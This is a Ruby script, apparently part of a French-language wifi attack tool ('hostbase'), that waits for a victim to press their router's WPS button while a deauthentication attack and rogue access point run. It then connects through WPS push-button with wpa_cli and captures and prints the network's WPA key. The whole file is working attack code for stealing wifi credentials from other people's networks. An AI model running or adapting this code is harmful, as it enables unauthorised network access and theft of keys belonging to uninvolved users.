#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... nettoyage des fichiers\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall berate_ap`
`killall hostapd-mana`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
`killall wash`
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
`rm -rf *.pid`
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartedos.txt").readlines.each do |cartedos|
   puts cartedos
$cartedos = cartedos.chomp
puts "Retour a la normale des interfaces wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 2
`ip link set #{$cartedos} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
`killall wash`
`killall bash`
puts "Bye..."
exit
end
end
else
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall berate_ap`
`killall hostapd-mana`
`killall dnsspoof`
`killall xterm`
`killall wash`
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
`rm -rf *.txt`
`rm -rf *.pid`
sleep 2
puts "Retour a la normale des interfaces wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 3
`systemctl enable NetworkManager.service`
sleep 3
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
`killall wash`
`killall bash`
puts "Bye..."
exit
end
end



class Selection
def self.victimeattente      
puts "Lancement de wash..."
wash = Thread.new { `bash wash.sh` }
Selection.wpsPush # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end
   
   
   def self.wpsPush 
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 2
puts "En attente d'une connexion... ctrl+c pour sortir..."
until File.read('wash.txt').include?('wps_selected_registrar')
sleep 1
end
puts "\e[1;32m[[*] Un utilisateur s'est connecté et le bouton WPS a été appuyé...\e[0m"
puts "\e[1;32m[*] Arret de la DoS...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/hostbase-1.5FR/wash.pid').to_i
`killall wash`
if File.exist?("terminalfrequence.pid")
sleep 1
Process.kill 15, File.read('/tmp/hostbase-1.5FR/terminalfrequence.pid').to_i
`killall wash`
else
nil
end
puts "Lancement de wpa_cli..."
load 'historique.rb'
`killall wash`
`killall xterm`
`killall sleep`
`killall mdk3`
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 3
`rfkill unblock all`
`ip link set #{$cartedos} up`
sleep 6
       puts "\e[1;32m[*] En attente de la clé wifi...\e[0m"
`killall wpa_supplicant`
Dir.chdir '/etc'    
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.5FR/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
`killall wash`
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}" # A CHANGER PAR $BSSID  # On lance wpa_cli et wps_pbc en tant que thread
    sleep(20) # Temps avant la relance de la commande
  end
end
Selection.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
 sleep(5000000)
end

def self.wpsGrab
Dir.chdir '/etc'
sleep 2
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] La clé wifi WPA a été capturée et sauvegardé dans le répertoire: /etc/wpa_supplicant.conf\e[0m"
puts "\e[1;32m[*] Commande pour récupérer et sauvegarder la clé WPA: cat /etc/wpa_supplicant.conf\e[0m"
puts "\e[1;32m[*] Clé wifi WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
   `killall wpa_supplicant`
end
end
end
